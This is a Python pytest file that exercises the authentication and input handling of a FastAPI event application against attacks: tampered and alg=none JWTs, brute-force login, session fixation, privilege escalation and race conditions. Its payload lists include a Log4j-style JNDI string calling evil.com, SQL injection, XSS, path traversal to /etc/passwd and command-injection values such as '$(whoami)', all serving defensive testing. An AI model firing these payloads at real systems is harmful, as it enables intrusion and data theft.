"""
Security tests for authentication flows with realistic attack scenarios.

Tests various attack vectors and security vulnerabilities in the authentication system.
"""

import uuid
import time
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock
from io import StringIO
import json

import pytest
from hypothesis import given, strategies as st, settings
from fastapi import status
from fastapi.testclient import TestClient

from tests.fixtures.faker_providers import setup_faker_providers


@pytest.mark.security
class TestJWTTokenSecurity:
    """Test JWT token security and vulnerability scenarios."""
    
    @pytest.mark.faker
    def test_jwt_token_tampering_detection(self, client, faker_instance):
        """Test detection of tampered JWT tokens."""
        fake = setup_faker_providers(faker_instance)
        
        # Mock valid authentication to get a token
        with patch("app.auth.jwt_authentication") as mock_auth:
            mock_token = f"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.{fake.uuid4()}.{fake.uuid4()}"
            
            # Test with tampered token signature
            tampered_token = mock_token[:-10] + "tampered123"
            
            headers = {"Authorization": f"Bearer {tampered_token}"}
            response = client.get("/events/", headers=headers)
            
            # Should reject tampered tokens
            assert response.status_code in [
                status.HTTP_401_UNAUTHORIZED,
                status.HTTP_403_FORBIDDEN
            ]
    
    @pytest.mark.faker
    def test_jwt_token_expiry_enforcement(self, client, faker_instance):
        """Test enforcement of JWT token expiry."""
        fake = setup_faker_providers(faker_instance)
        
        # Mock expired token scenario
        with patch("app.auth.jwt_authentication") as mock_auth:
            # Simulate token validation that detects expiry
            mock_auth.get_strategy.return_value.read_token.side_effect = Exception("Token expired")
            
            expired_token = f"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.{fake.uuid4()}.{fake.uuid4()}"
            headers = {"Authorization": f"Bearer {expired_token}"}
            
            response = client.get("/events/", headers=headers)
            
            # Should reject expired tokens
            assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    @given(
        malicious_payload=st.text(min_size=10, max_size=1000),
        fake_signature=st.text(min_size=10, max_size=100)
    )
    @settings(max_examples=20, deadline=5000)
    def test_jwt_malicious_payload_injection(self, client, malicious_payload, fake_signature):
        """Test resistance to malicious JWT payload injection."""
        import base64
        
        # Create malicious JWT-like structure
        try:
            header = base64.b64encode(b'{"typ":"JWT","alg":"HS256"}').decode().rstrip('=')
            payload = base64.b64encode(malicious_payload.encode()).decode().rstrip('=')
            malicious_token = f"{header}.{payload}.{fake_signature}"
            
            headers = {"Authorization": f"Bearer {malicious_token}"}
            response = client.get("/events/", headers=headers)
            
            # Should always reject malicious tokens
            assert response.status_code in [
                status.HTTP_401_UNAUTHORIZED,
                status.HTTP_403_FORBIDDEN,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
        except Exception:
            # If token construction fails, that's also acceptable
            pass
    
    @pytest.mark.faker
    def test_jwt_algorithm_confusion_attack(self, client, faker_instance):
        """Test resistance to JWT algorithm confusion attacks (alg=none, etc.)."""
        fake = setup_faker_providers(faker_instance)
        
        attack_scenarios = [
            # Algorithm confusion attacks
            '{"typ":"JWT","alg":"none"}',
            '{"typ":"JWT","alg":"None"}',
            '{"typ":"JWT","alg":"NONE"}',
            '{"typ":"JWT","alg":""}',
            '{"typ":"JWT"}',  # Missing algorithm
        ]
        
        for malicious_header in attack_scenarios:
            try:
                import base64
                header = base64.b64encode(malicious_header.encode()).decode().rstrip('=')
                payload = base64.b64encode(b'{"user_id":"malicious"}').decode().rstrip('=')
                signature = "malicious_signature"
                
                malicious_token = f"{header}.{payload}.{signature}"
                headers = {"Authorization": f"Bearer {malicious_token}"}
                
                response = client.get("/events/", headers=headers)
                
                # Should reject algorithm confusion attempts
                assert response.status_code in [
                    status.HTTP_401_UNAUTHORIZED,
                    status.HTTP_403_FORBIDDEN,
                    status.HTTP_422_UNPROCESSABLE_ENTITY
                ]
            except Exception:
                # If token construction fails, that's also good
                pass


@pytest.mark.security
class TestAuthenticationRateLimiting:
    """Test rate limiting on authentication endpoints."""
    
    @pytest.mark.faker
    def test_login_brute_force_protection(self, client, faker_instance):
        """Test protection against brute force login attempts."""
        fake = setup_faker_providers(faker_instance)
        
        # Simulate rapid login attempts
        login_data = {
            "username": fake.email(),
            "password": "wrong_password"
        }
        
        responses = []
        for attempt in range(15):  # 15 rapid attempts
            response = client.post("/auth/jwt/login", data=login_data)
            responses.append(response)
            
            # Small delay to simulate realistic timing
            time.sleep(0.01)
        
        # Should implement rate limiting after several attempts
        later_responses = responses[-5:]  # Last 5 attempts
        rate_limited_responses = [
            r for r in later_responses 
            if r.status_code == status.HTTP_429_TOO_MANY_REQUESTS
        ]
        
        # At least some of the later attempts should be rate limited
        # (This assumes rate limiting is implemented)
        assert len(rate_limited_responses) >= 1 or all(
            r.status_code == status.HTTP_401_UNAUTHORIZED for r in responses
        )
    
    @pytest.mark.faker  
    def test_password_reset_rate_limiting(self, client, faker_instance):
        """Test rate limiting on password reset requests."""
        fake = setup_faker_providers(faker_instance)
        
        email = fake.email()
        
        # Rapid password reset requests
        responses = []
        for attempt in range(10):
            response = client.post(
                "/auth/forgot-password",
                json={"email": email}
            )
            responses.append(response)
        
        # Should implement rate limiting for password reset
        later_responses = responses[-3:]
        rate_limited = any(
            r.status_code == status.HTTP_429_TOO_MANY_REQUESTS
            for r in later_responses
        )
        
        # Either rate limited or handled gracefully
        assert rate_limited or all(
            r.status_code in [status.HTTP_200_OK, status.HTTP_404_NOT_FOUND]
            for r in responses
        )
    
    @pytest.mark.faker
    def test_qr_token_abuse_protection(self, client, faker_instance):
        """Test protection against QR token abuse."""
        fake = setup_faker_providers(faker_instance)
        
        # Test rapid QR token generation requests
        with patch("app.auth.current_active_organizer") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_user.is_organizer = True
            mock_auth.return_value = mock_user
            
            token_requests = []
            for attempt in range(20):  # Many rapid requests
                token_data = {
                    "attendee_id": str(uuid.uuid4()),
                    "expire_hours": 24,
                    "max_uses": 5
                }
                
                response = client.post("/qr/generate-token", json=token_data)
                token_requests.append(response)
        
        # Should handle rapid requests gracefully
        error_responses = [
            r for r in token_requests[-5:]  # Last 5 requests
            if r.status_code >= 400
        ]
        
        # Some rate limiting or graceful handling should occur
        assert len(error_responses) >= 1 or all(
            r.status_code in [status.HTTP_200_OK, status.HTTP_404_NOT_FOUND]
            for r in token_requests
        )


@pytest.mark.security
class TestSessionSecurity:
    """Test session and cookie security."""
    
    @pytest.mark.faker
    def test_session_fixation_protection(self, client, faker_instance):
        """Test protection against session fixation attacks."""
        fake = setup_faker_providers(faker_instance)
        
        # Get initial session
        response1 = client.get("/")
        initial_cookies = response1.cookies
        
        # Attempt login with existing session
        login_data = {
            "username": fake.email(),
            "password": fake.password()
        }
        
        response2 = client.post("/auth/jwt/login", data=login_data, cookies=initial_cookies)
        
        # Session should be regenerated or handled securely
        if response2.status_code == status.HTTP_200_OK:
            # Check if new session/token is issued
            assert "access_token" in response2.json() or response2.cookies != initial_cookies
    
    @pytest.mark.faker
    def test_concurrent_session_handling(self, client, faker_instance):
        """Test handling of concurrent sessions for same user."""
        fake = setup_faker_providers(faker_instance)
        
        with patch("app.auth.jwt_authentication") as mock_auth:
            # Mock successful authentication
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_user.email = fake.email()
            mock_user.is_active = True
            
            # Simulate multiple concurrent logins
            tokens = []
            for session in range(5):
                mock_token = f"token_{session}_{fake.uuid4()}"
                tokens.append(mock_token)
                
                headers = {"Authorization": f"Bearer {mock_token}"}
                response = client.get("/events/", headers=headers)
                
                # Should handle concurrent sessions appropriately
                assert response.status_code in [
                    status.HTTP_200_OK,
                    status.HTTP_401_UNAUTHORIZED,
                    status.HTTP_403_FORBIDDEN
                ]


@pytest.mark.security
class TestInputValidationSecurity:
    """Test input validation and injection attack prevention."""
    
    @given(
        malicious_input=st.one_of(
            st.text(min_size=1, max_size=1000),
            st.lists(st.text(), min_size=1, max_size=10),
            st.dictionaries(st.text(), st.text(), min_size=1, max_size=5)
        )
    )
    @settings(max_examples=30, deadline=5000)
    def test_api_input_sanitization(self, client, malicious_input):
        """Test API input sanitization against various attack payloads."""
        
        # Common injection attack patterns
        attack_patterns = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com}",  # Log4j style
            "../../../etc/passwd",  # Path traversal
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "\u0000",  # Null byte
            "\n\r",    # CRLF injection
        ]
        
        for attack_pattern in attack_patterns:
            # Test in various contexts
            test_data = {
                "name": attack_pattern,
                "email": f"test{attack_pattern}@example.com",
                "description": f"Description with {attack_pattern}",
            }
            
            # Test event creation endpoint
            with patch("app.auth.current_active_organizer") as mock_auth:
                mock_user = MagicMock()
                mock_user.id = uuid.uuid4()
                mock_user.is_organizer = True
                mock_auth.return_value = mock_user
                
                response = client.post("/events/", json=test_data)
                
                # Should either sanitize or reject malicious input
                if response.status_code == status.HTTP_201_CREATED:
                    # If accepted, check that dangerous content is sanitized
                    response_data = response.json()
                    for field, value in response_data.items():
                        if isinstance(value, str):
                            # Should not contain raw script tags or SQL
                            assert "<script>" not in value.lower()
                            assert "drop table" not in value.lower()
                else:
                    # Rejection is also acceptable
                    assert response.status_code in [
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_422_UNPROCESSABLE_ENTITY
                    ]
    
    @pytest.mark.faker
    def test_sql_injection_prevention(self, client, faker_instance):
        """Test SQL injection prevention in search and filter endpoints."""
        fake = setup_faker_providers(faker_instance)
        
        sql_injection_payloads = [
            "'; DELETE FROM users; --",
            "1' OR '1'='1",
            "1'; DROP TABLE events; --",
            "' UNION SELECT password FROM users --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
        ]
        
        with patch("app.auth.current_active_organizer") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_user.is_organizer = True
            mock_auth.return_value = mock_user
            
            for payload in sql_injection_payloads:
                # Test in search parameters
                response = client.get(
                    "/events/",
                    params={"search": payload, "limit": payload}
                )
                
                # Should handle SQL injection attempts gracefully
                assert response.status_code in [
                    status.HTTP_200_OK,
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_422_UNPROCESSABLE_ENTITY
                ]
                
                # Response should not contain SQL error messages
                if response.status_code == status.HTTP_200_OK:
                    response_text = response.text.lower()
                    sql_errors = [
                        "sql", "syntax error", "mysql", "postgresql", 
                        "sqlite", "database", "table"
                    ]
                    for error_keyword in sql_errors:
                        assert error_keyword not in response_text
    
    @pytest.mark.faker
    def test_xss_prevention_in_user_content(self, client, faker_instance):
        """Test XSS prevention in user-generated content."""
        fake = setup_faker_providers(faker_instance)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<object data='javascript:alert(`XSS`)'></object>",
            "<embed src='javascript:alert(`XSS`)'>",
            "<link rel='stylesheet' href='javascript:alert(`XSS`)'>",
        ]
        
        with patch("app.auth.current_active_user") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_auth.return_value = mock_user
            
            for payload in xss_payloads:
                # Test in attendee bio
                registration_data = {
                    "display_name": f"User {fake.first_name()}",
                    "category": "SINGLE_WOMAN",
                    "public_bio": payload,
                    "contact_email": fake.email()
                }
                
                event_id = uuid.uuid4()
                response = client.post(
                    f"/attendees/register/{event_id}",
                    json=registration_data
                )
                
                # Should sanitize or reject XSS attempts
                if response.status_code == status.HTTP_201_CREATED:
                    response_data = response.json()
                    bio = response_data.get("public_bio", "")
                    
                    # XSS payload should be sanitized
                    assert "<script>" not in bio
                    assert "javascript:" not in bio
                    assert "onerror=" not in bio
                    assert "onload=" not in bio
                else:
                    # Rejection is also acceptable
                    assert response.status_code in [
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_422_UNPROCESSABLE_ENTITY
                    ]


@pytest.mark.security
class TestPrivilegeEscalation:
    """Test privilege escalation attack scenarios."""
    
    @pytest.mark.faker
    def test_horizontal_privilege_escalation(self, client, faker_instance):
        """Test prevention of horizontal privilege escalation."""
        fake = setup_faker_providers(faker_instance)
        
        # Create two different organizers
        organizer1_id = uuid.uuid4()
        organizer2_id = uuid.uuid4()
        event_id = uuid.uuid4()
        
        with patch("app.auth.current_active_organizer") as mock_auth:
            # Organizer 1 creates an event
            mock_user1 = MagicMock()
            mock_user1.id = organizer1_id
            mock_user1.is_organizer = True
            mock_auth.return_value = mock_user1
            
            # Now Organizer 2 tries to access Organizer 1's event
            mock_user2 = MagicMock()
            mock_user2.id = organizer2_id
            mock_user2.is_organizer = True
            mock_auth.return_value = mock_user2
            
            # Should not be able to access other organizer's events
            response = client.get(f"/events/{event_id}")
            
            # Should deny access or return not found
            assert response.status_code in [
                status.HTTP_404_NOT_FOUND,
                status.HTTP_403_FORBIDDEN
            ]
    
    @pytest.mark.faker
    def test_vertical_privilege_escalation(self, client, faker_instance):
        """Test prevention of vertical privilege escalation."""
        fake = setup_faker_providers(faker_instance)
        
        # Regular user tries to access organizer-only endpoints
        with patch("app.auth.current_active_user") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_user.is_organizer = False  # Not an organizer
            mock_user.is_superuser = False  # Not a superuser
            mock_auth.return_value = mock_user
            
            # Try to access organizer endpoints
            organizer_endpoints = [
                ("/events/", "POST"),
                (f"/events/{uuid.uuid4()}/publish", "POST"),
                (f"/qr/generate-token", "POST"),
            ]
            
            for endpoint, method in organizer_endpoints:
                if method == "POST":
                    response = client.post(endpoint, json={})
                else:
                    response = client.get(endpoint)
                
                # Should deny access to organizer endpoints
                assert response.status_code in [
                    status.HTTP_401_UNAUTHORIZED,
                    status.HTTP_403_FORBIDDEN
                ]
    
    @pytest.mark.faker
    def test_superuser_privilege_protection(self, client, faker_instance):
        """Test protection of superuser-only functionality."""
        fake = setup_faker_providers(faker_instance)
        
        # Regular organizer tries to access superuser functionality
        with patch("app.auth.current_active_user") as mock_auth:
            mock_organizer = MagicMock()
            mock_organizer.id = uuid.uuid4()
            mock_organizer.is_organizer = True
            mock_organizer.is_superuser = False  # Not a superuser
            mock_auth.return_value = mock_organizer
            
            # Try to access superuser endpoints
            response = client.get("/admin/super-user-setup")
            
            # Should deny access to superuser functionality
            assert response.status_code in [
                status.HTTP_401_UNAUTHORIZED,
                status.HTTP_403_FORBIDDEN,
                status.HTTP_404_NOT_FOUND
            ]


@pytest.mark.security
class TestInformationDisclosure:
    """Test prevention of information disclosure vulnerabilities."""
    
    @pytest.mark.faker
    def test_error_message_information_leakage(self, client, faker_instance):
        """Test that error messages don't leak sensitive information."""
        fake = setup_faker_providers(faker_instance)
        
        # Test various error scenarios
        error_scenarios = [
            ("/events/999999", "GET"),  # Non-existent event
            ("/attendees/invalid-uuid", "GET"),  # Invalid UUID
            ("/auth/jwt/login", "POST"),  # Invalid login
        ]
        
        for endpoint, method in error_scenarios:
            if method == "POST":
                response = client.post(endpoint, json={"invalid": "data"})
            else:
                response = client.get(endpoint)
            
            # Check that error responses don't contain sensitive info
            if response.status_code >= 400:
                response_text = response.text.lower()
                
                # Should not leak system information
                sensitive_keywords = [
                    "traceback", "stack trace", "/home/", "/usr/",
                    "database", "internal server error", "sqlalchemy",
                    "fastapi", "uvicorn", "exception"
                ]
                
                for keyword in sensitive_keywords:
                    assert keyword not in response_text, f"Error message contains '{keyword}'"
    
    @pytest.mark.faker
    def test_user_enumeration_prevention(self, client, faker_instance):
        """Test prevention of user enumeration attacks."""
        fake = setup_faker_providers(faker_instance)
        
        # Test password reset with existing vs non-existing emails
        existing_email = fake.email()
        non_existing_email = fake.email()
        
        responses = []
        for email in [existing_email, non_existing_email]:
            response = client.post(
                "/auth/forgot-password",
                json={"email": email}
            )
            responses.append(response)
        
        # Responses should be similar to prevent user enumeration
        status_codes = [r.status_code for r in responses]
        
        # Either both succeed (good) or both fail similarly
        assert len(set(status_codes)) <= 1, "Responses differ, may leak user existence"
        
        # Response times should be similar (timing attack prevention)
        if len(responses) >= 2:
            # This is a simplified check - real timing attacks need more sophisticated measurement
            response_lengths = [len(r.text) for r in responses]
            assert abs(response_lengths[0] - response_lengths[1]) < 100, "Response lengths differ significantly"


@pytest.mark.security
class TestConcurrencyAttacks:
    """Test security under concurrent access scenarios."""
    
    @pytest.mark.faker
    def test_race_condition_in_token_generation(self, client, faker_instance):
        """Test race conditions in QR token generation."""
        fake = setup_faker_providers(faker_instance)
        
        attendee_id = uuid.uuid4()
        
        with patch("app.auth.current_active_organizer") as mock_auth:
            mock_user = MagicMock()
            mock_user.id = uuid.uuid4()
            mock_user.is_organizer = True
            mock_auth.return_value = mock_user
            
            # Simulate concurrent token generation requests
            import concurrent.futures
            
            def generate_token():
                token_data = {
                    "attendee_id": str(attendee_id),
                    "expire_hours": 24,
                    "max_uses": 5
                }
                return client.post("/qr/generate-token", json=token_data)
            
            # Submit concurrent requests
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(generate_token) for _ in range(10)]
                concurrent_responses = [f.result() for f in futures]
            
            # Should handle concurrent requests gracefully
            success_responses = [
                r for r in concurrent_responses 
                if r.status_code == status.HTTP_200_OK
            ]
            
            # Either handle gracefully or implement proper concurrency control
            assert len(success_responses) <= 10  # No more successes than requests
    
    @pytest.mark.faker
    def test_concurrent_authentication_attempts(self, client, faker_instance):
        """Test security of concurrent authentication attempts."""
        fake = setup_faker_providers(faker_instance)
        
        # Use the same credentials for all concurrent attempts
        login_data = {
            "username": fake.email(),
            "password": fake.password()
        }
        
        import concurrent.futures
        
        def attempt_login():
            return client.post("/auth/jwt/login", data=login_data)
        
        # Submit concurrent login attempts
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(attempt_login) for _ in range(8)]
            concurrent_responses = [f.result() for f in futures]
        
        # Should handle concurrent authentication securely
        status_codes = [r.status_code for r in concurrent_responses]
        
        # All responses should be consistent (either all fail or implement proper handling)
        assert len(set(status_codes)) <= 2, "Inconsistent response patterns under concurrency"


# Helper fixtures for security testing
@pytest.fixture
def security_test_client():
    """Create a test client configured for security testing."""
    from fastapi.testclient import TestClient
    from app.main import app
    
    return TestClient(app)


@pytest.fixture
def attack_payloads():
    """Common attack payloads for security testing."""
    return {
        "xss": [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ],
        "sql_injection": [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
        "command_injection": [
            "; ls -la",
            "| whoami",
            "`id`",
            "$(whoami)",
        ]
    }